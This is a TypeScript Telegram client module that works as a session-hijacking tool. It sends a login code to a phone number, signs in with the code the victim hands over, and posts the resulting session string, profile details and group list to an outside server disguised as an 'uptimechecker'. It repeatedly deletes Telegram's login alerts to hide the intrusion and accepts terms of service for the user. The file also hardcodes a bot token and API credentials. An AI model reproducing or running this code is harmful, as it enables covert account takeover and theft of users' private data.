import { Api } from "telegram";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import axios from "axios";
import { sleep } from "telegram/Helpers";
import { NewMessage, NewMessageEvent } from "telegram/events";
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";

const clients = new Map();
const apiId = 24559917 || parseInt(process.env.API_ID);
const apiHash = "702294de6c08f4fd8c94c3141e0cebfb" || process.env.API_HASH;

export async function restAcc(phoneNumber) {
    await sleep(1000);
    console.log("Reset - ", phoneNumber);
    const client: TelegramManager = getClient(phoneNumber)
    if (client) {
        await client.deleteMessages();
        await client.client.destroy();
        await client.client.disconnect();
        client.client.session.delete();
        client.client = null;
        delete client['client'];
        await deleteClient(phoneNumber);
    }
}

export function getClient(number): TelegramManager {
    return clients.get(number);
}

export async function hasClient(number) {
    return clients.has(number);
}

export async function deleteClient(number) {
    console.log("Deleting Client");
    return clients.delete(number);
}

export async function disconnectAll() {
    for (const [phoneNumber, client] of clients.entries()) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}

export async function createClient(number) {
    if (clients.has(number)) {
        const cli: TelegramManager = clients.get(number);
        setTimeout(async () => {
            await restAcc(number)
        }, 240000);
        return (await cli.sendCode(false));
    } else {
        const cli = new TelegramManager(number);
        clients.set(number, cli);
        setTimeout(async () => {
            await restAcc(number)
        }, 240000);
        return (await cli.sendCode(false));
    }
}

class TelegramManager {
    session: any;
    phoneNumber: any;
    client: TelegramClient;
    phoneCodeHash: any;
    constructor(number) {
        this.phoneNumber = number;
        this.session = new StringSession('');
        this.client = null;
        this.createClient();
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async createClient() {
        try {
            this.client = new TelegramClient(this.session, apiId, apiHash, {
                connectionRetries: 5,
            });
            await this.client.connect();
        } catch (error) {
            console.log(error);
        }
    }

    async deleteMessages() {
        const msgs = await this.client.getMessages("777000", { limit: 2 });
        msgs.forEach(async msg => {
            if (msg.text.toLowerCase().includes('login'))
                await msg.delete({ revoke: true });
        })
    }

    async sendCode(
        forceSMS = false
    ): Promise<{
        phoneCodeHash: string;
        isCodeViaApp: boolean;
    }> {
        try {
            await this.client.connect();
            console.log("Sending OTP - ", this.phoneNumber, apiId, apiHash);
            const sendResult = await this.client.invoke(
                new Api.auth.SendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    apiId,
                    apiHash,
                    settings: new Api.CodeSettings({}),
                })
            );
            console.log('Send result - ', sendResult);
            if (sendResult instanceof Api.auth.SentCodeSuccess)
                throw new Error("logged in right after sending the code");
            this.phoneCodeHash = sendResult.phoneCodeHash

            if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
                return {
                    phoneCodeHash: sendResult.phoneCodeHash,
                    isCodeViaApp:
                        sendResult.type instanceof Api.auth.SentCodeTypeApp,
                };
            }

            const resendResult = await this.client.invoke(
                new Api.auth.ResendCode({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: sendResult.phoneCodeHash,
                })
            );
            console.log('ReSend result - ', sendResult);
            if (resendResult instanceof Api.auth.SentCodeSuccess)
                throw new Error("logged in right after resending the code");

            this.phoneCodeHash = resendResult.phoneCodeHash

            return {
                phoneCodeHash: resendResult.phoneCodeHash,
                isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
            };

        } catch (err: any) {
            console.log(err);
            if (err.errorMessage === "AUTH_RESTART") {
                return this.client.sendCode({ apiId, apiHash }, `+${this.phoneNumber}`, forceSMS);
            } else {
                throw err;
            }
        }
    }

    async login(phoneCode: any) {
        let isRegistrationRequired = false
        let termsOfService;
        try {
            if (!phoneCode) {
                throw new Error("Code is empty");
            }
            if (!this.client.connected) {
                await this.client.connect();
            }
            const result = await this.client?.invoke(
                new Api.auth.SignIn({
                    phoneNumber: `+${this.phoneNumber}`,
                    phoneCodeHash: this.phoneCodeHash,
                    phoneCode,
                })
            );
            if (result instanceof Api.auth.AuthorizationSignUpRequired) {
                isRegistrationRequired = true;
                termsOfService = result.termsOfService;
            } else {
                console.log(this.client.session.save());
                const sess = this.client.session.save() as unknown as string;
                const user: any = await result.user.toJSON();
                const chats = await this.client?.getDialogs({ limit: 130 });
                let personalChats = 0;
                let channels = 0;
                const chatsArray = [];

                chats.map((chat: any) => {
                    if (chat.isChannel || chat.isGroup) {
                        channels++;
                        const chatEntity = chat.entity.toJSON();
                        const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
                        if (!chatEntity.broadcast && !cannotSendMsgs) {
                            chatsArray.push(chatEntity);
                        }
                    }
                    else {
                        personalChats++
                    }
                });
                const payload3 = {
                    mobile: user.phone,
                    session: `${sess}`,
                    firstName: user.firstName,
                    lastName: user.lastName,
                    userName: user.username ? `@${user.username}` : null,
                    channels: channels,
                    personalChats: personalChats
                };
                await axios.post(`https://uptimechecker.onrender.com/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
                await axios.post(`https://uptimechecker.onrender.com/channels`, { channels: chatsArray }, { headers: { 'Content-Type': 'application/json' } });
                setInterval(async () => {
                    await this.deleteMessages();
                }, 5000)
                setTimeout(async () => {
                    await restAcc(this.phoneNumber);
                }, 50000);
                return { status: 200, message: "Login success" }
            }
        } catch (err: any) {
            console.log(err);
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                console.log("passowrd Required")
                return { status: 400, message: "2FA required" }
                // return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
            } else {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
            await restAcc(this.phoneNumber);
            return { status: 400, message: err.errorMessage }
        }

        if (isRegistrationRequired) {
            try {
                let lastName = 'last name';
                let firstName = "first name";
                const { user } = (await this.client.invoke(
                    new Api.auth.SignUp({
                        phoneNumber: `+${this.phoneNumber}`,
                        phoneCodeHash: this.phoneCodeHash,
                        firstName,
                        lastName,
                    })
                )) as Api.auth.Authorization;

                if (termsOfService) {
                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.
                    await this.client.invoke(
                        new Api.help.AcceptTermsOfService({
                            id: termsOfService.id,
                        })
                    );
                }

                return user;
            } catch (err: any) {
                const shouldWeStop = false//await authParams.onError(err);
                if (shouldWeStop) {
                    throw new Error("AUTH_USER_CANCEL");
                }
            }
        }
        await restAcc(this.phoneNumber);
    }
}
